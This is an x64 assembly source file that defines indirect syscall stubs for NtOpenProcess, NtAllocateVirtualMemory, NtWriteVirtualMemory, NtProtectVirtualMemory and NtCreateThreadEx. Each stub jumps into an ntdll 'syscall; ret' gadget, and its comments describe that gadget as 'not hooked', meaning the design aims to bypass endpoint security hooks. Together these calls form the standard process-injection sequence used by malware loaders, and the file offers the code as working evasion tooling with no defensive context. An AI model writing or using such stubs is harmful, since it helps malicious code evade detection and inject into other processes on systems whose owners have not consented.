; Indirect syscall stubs for x64
; Each function:
;   1. Loads SSN into eax
;   2. Jumps to the real "syscall; ret" gadget in ntdll.dll (not hooked)
;   3. Returns to caller — stack layout identical to native NT function

EXTERN Syscall__NtAllocateVirtualMemory_entry_ssn:DWORD
EXTERN Syscall__NtAllocateVirtualMemory_entry_gadget:QWORD
EXTERN Syscall__NtWriteVirtualMemory_entry_ssn:DWORD
EXTERN Syscall__NtWriteVirtualMemory_entry_gadget:QWORD
EXTERN Syscall__NtProtectVirtualMemory_entry_ssn:DWORD
EXTERN Syscall__NtProtectVirtualMemory_entry_gadget:QWORD
EXTERN Syscall__NtCreateThreadEx_entry_ssn:DWORD
EXTERN Syscall__NtCreateThreadEx_entry_gadget:QWORD
EXTERN Syscall__NtOpenProcess_entry_ssn:DWORD
EXTERN Syscall__NtOpenProcess_entry_gadget:QWORD

.CODE

IndirectNtAllocateVirtualMemory PROC
    mov r10, rcx
    mov eax, DWORD PTR [Syscall__NtAllocateVirtualMemory_entry_ssn]
    jmp QWORD PTR [Syscall__NtAllocateVirtualMemory_entry_gadget]
IndirectNtAllocateVirtualMemory ENDP

IndirectNtWriteVirtualMemory PROC
    mov r10, rcx
    mov eax, DWORD PTR [Syscall__NtWriteVirtualMemory_entry_ssn]
    jmp QWORD PTR [Syscall__NtWriteVirtualMemory_entry_gadget]
IndirectNtWriteVirtualMemory ENDP

IndirectNtProtectVirtualMemory PROC
    mov r10, rcx
    mov eax, DWORD PTR [Syscall__NtProtectVirtualMemory_entry_ssn]
    jmp QWORD PTR [Syscall__NtProtectVirtualMemory_entry_gadget]
IndirectNtProtectVirtualMemory ENDP

IndirectNtCreateThreadEx PROC
    mov r10, rcx
    mov eax, DWORD PTR [Syscall__NtCreateThreadEx_entry_ssn]
    jmp QWORD PTR [Syscall__NtCreateThreadEx_entry_gadget]
IndirectNtCreateThreadEx ENDP

IndirectNtOpenProcess PROC
    mov r10, rcx
    mov eax, DWORD PTR [Syscall__NtOpenProcess_entry_ssn]
    jmp QWORD PTR [Syscall__NtOpenProcess_entry_gadget]
IndirectNtOpenProcess ENDP

END